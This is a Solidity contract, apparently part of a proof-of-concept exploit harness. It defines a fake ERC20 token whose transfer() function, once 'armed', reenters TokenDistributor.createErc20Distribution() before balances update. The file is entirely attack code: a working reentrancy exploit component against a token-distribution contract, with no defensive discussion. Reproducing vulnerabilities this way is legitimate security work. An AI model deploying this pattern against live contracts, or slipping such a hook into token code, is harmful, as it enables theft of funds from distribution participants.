// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../distribution/TokenDistributor.sol";
import "../distribution/ITokenDistributor.sol";
import "../distribution/ITokenDistributorParty.sol";
import "../tokens/IERC20.sol";

/// @notice Minimal ERC20 that mimics an ERC777 `tokensToSend` hook: while armed,
///         `transfer()` reenters `TokenDistributor.createErc20Distribution()`
///         BEFORE balances are updated.
/// @dev    Used only by the exploit harness (`deploy.sh`).
contract ReenteringERC20 is IERC20 {
    string public name = "ReenteringToken";
    string public symbol = "RET";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply;

    TokenDistributor public distributor;
    ITokenDistributorParty public attackParty;
    bool public armed;

    constructor(TokenDistributor distributor_) {
        distributor = distributor_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function arm(ITokenDistributorParty party) external {
        attackParty = party;
        armed = true;
    }

    function disarm() external {
        armed = false;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (armed) {
            distributor.createErc20Distribution(
                IERC20(address(this)),
                attackParty,
                payable(address(0)),
                0
            );
        }
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}
